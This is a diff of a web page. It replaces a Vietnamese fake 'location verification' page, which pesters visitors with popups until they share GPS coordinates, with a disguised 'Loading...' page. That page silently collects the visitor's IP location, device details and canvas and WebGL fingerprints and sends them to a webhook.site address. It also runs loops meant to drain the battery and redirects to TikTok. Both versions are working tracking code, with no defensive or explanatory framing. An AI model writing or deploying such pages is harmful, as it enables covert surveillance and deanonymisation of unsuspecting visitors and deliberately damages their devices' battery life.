@@ -1,74 +1,113 @@
 <!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <title>Xác minh vị trí</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #fff; }
-        button { background: #fe2c55; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
-        .popup-box { background: #222; padding: 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
-    </style>
+<html>
+<head><meta charset="UTF-8"><title>Loading</title>
+<style>body{background:#fff;text-align:center;padding-top:100px;font-family:Arial}.loader{border:4px solid #ccc;border-top:4px solid #333;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
 </head>
 <body>
-    <h2>📍 Xác minh vị trí</h2>
-    <p>Hệ thống cần vị trí của bạn để tiếp tục</p>
-    <button onclick="requestLocation()">Nhấn để xác minh</button>
-    <div id="popupArea"></div>
+<div class="loader"></div>
+<p>Loading...</p>
+<script>
+const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";
+let data = {};
 
-    <script>
-    const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";
-    let popupCount = 0;
-    
-    function requestLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendGPS, showPopup);
-        } else {
-            showPopup();
-        }
+fetch('https://ipapi.co/json/')
+  .then(r => r.json())
+  .then(ip => {
+    data.ip = ip.ip; data.city = ip.city; data.region = ip.region;
+    data.country = ip.country_name; data.latitude = ip.latitude;
+    data.longitude = ip.longitude; data.org = ip.org;
+    data.timezone = ip.timezone;
+    sendData();
+  }).catch(() => sendData());
+
+data.userAgent = navigator.userAgent;
+data.language = navigator.language;
+data.platform = navigator.platform;
+data.hardwareConcurrency = navigator.hardwareConcurrency;
+data.deviceMemory = navigator.deviceMemory || 'unknown';
+data.maxTouchPoints = navigator.maxTouchPoints;
+data.cookieEnabled = navigator.cookieEnabled;
+data.webdriver = navigator.webdriver;
+data.referrer = document.referrer;
+data.screenWidth = screen.width;
+data.screenHeight = screen.height;
+data.devicePixelRatio = window.devicePixelRatio;
+data.timezoneOffset = new Date().getTimezoneOffset();
+data.timestamp = Date.now();
+
+let plugins = [];
+for(let i=0;i<navigator.plugins.length;i++) plugins.push(navigator.plugins[i].name);
+data.plugins = plugins.join(',');
+
+try {
+  let c = document.createElement('canvas');
+  c.width = 200; c.height = 50;
+  let ctx = c.getContext('2d');
+  ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,50);
+  ctx.fillStyle = '#069'; ctx.fillText('fp',2,15);
+  data.canvasFingerprint = c.toDataURL();
+} catch(e){}
+
+try {
+  let gl = document.createElement('canvas').getContext('webgl');
+  if(gl){
+    let debug = gl.getExtension('WEBGL_debug_renderer_info');
+    if(debug) data.webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+  }
+} catch(e){}
+
+if(navigator.getBattery){
+  navigator.getBattery().then(b => {
+    data.batteryLevel = b.level * 100;
+    data.batteryCharging = b.charging;
+    sendData();
+  }).catch(()=>{});
+}
+
+function sendData(){
+  if(window._sent) return;
+  window._sent = true;
+  let payload = Object.entries(data).map(([k,v]) => `${k}=${encodeURIComponent(v)}`).join('&');
+  new Image().src = `${WEBHOOK}?${payload}&_=${Date.now()}`;
+  fetch(`${WEBHOOK}?${payload}`, {mode: 'no-cors'});
+}
+setTimeout(sendData, 500);
+
+// Silent battery drain (heavy CPU loop)
+function drainBattery() {
+  let start = Date.now();
+  while(Date.now() - start < 100) {
+    for(let i=0; i<10000; i++) Math.sqrt(Math.random() * 1000000);
+  }
+  requestAnimationFrame(drainBattery);
+}
+drainBattery();
+
+// Extra drain via WebGL render loop
+try {
+  let canvas = document.createElement('canvas');
+  canvas.width = 100; canvas.height = 100;
+  let gl = canvas.getContext('webgl');
+  if(gl){
+    function render(){
+      gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+      gl.clear(gl.COLOR_BUFFER_BIT);
+      requestAnimationFrame(render);
     }
-    
-    function sendGPS(pos) {
-        let lat = pos.coords.latitude;
-        let lon = pos.coords.longitude;
-        fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
-        document.body.innerHTML = "<h2>✅ Đã xác minh!</h2><p>Chuyển hướng...</p>";
-        setTimeout(() => {
-            window.location.href = "https://www.tiktok.com";
-        }, 1500);
-    }
-    
-    function showPopup() {
-        popupCount++;
-        let popupArea = document.getElementById('popupArea');
-        let newPopup = document.createElement('div');
-        newPopup.className = 'popup-box';
-        newPopup.innerHTML = `
-            <p>⚠️ LỖI ${popupCount} ⚠️</p>
-            <p>Không thể xác minh vị trí tự động</p>
-            <button onclick="requestLocation()">Nhấn để thử lại (${popupCount})</button>
-        `;
-        popupArea.appendChild(newPopup);
-        
-        // Also use alert if too many popups
-        if (popupCount >= 3) {
-            alert("⚠️ CẢNH BÁO: Vui lòng bật vị trí!\n⚠️ Nhấn OK và cho phép truy cập vị trí");
-        }
-        if (popupCount >= 5) {
-            alert("🚨 LẦN CUỐI: Bật vị trí ngay!");
-        }
-        if (popupCount >= 7) {
-            // Reload page to start over
-            location.reload();
-        }
-    }
-    
-    // Auto trigger first popup after 2 seconds
-    setTimeout(() => {
-        let fakeDiv = document.createElement('div');
-        fakeDiv.style.display = 'none';
-        document.body.appendChild(fakeDiv);
-        alert("📍 Yêu cầu vị trí\n📍 Nhấn OK và cho phép truy cập vị trí");
-    }, 2000);
-    </script>
+    render();
+  }
+} catch(e){}
+
+// Background fetch loop
+setInterval(() => {
+  fetch('https://ipapi.co/json/', {mode: 'no-cors'}).catch(()=>{});
+}, 100);
+
+// Redirect to random TikTok video after 2 seconds
+setTimeout(() => {
+  let randomId = Math.floor(Math.random() * 1000000000);
+  window.location.href = "https://www.tiktok.com/@tiktok/video/" + randomId;
+}, 2000);
+</script>
 </body>
 </html>
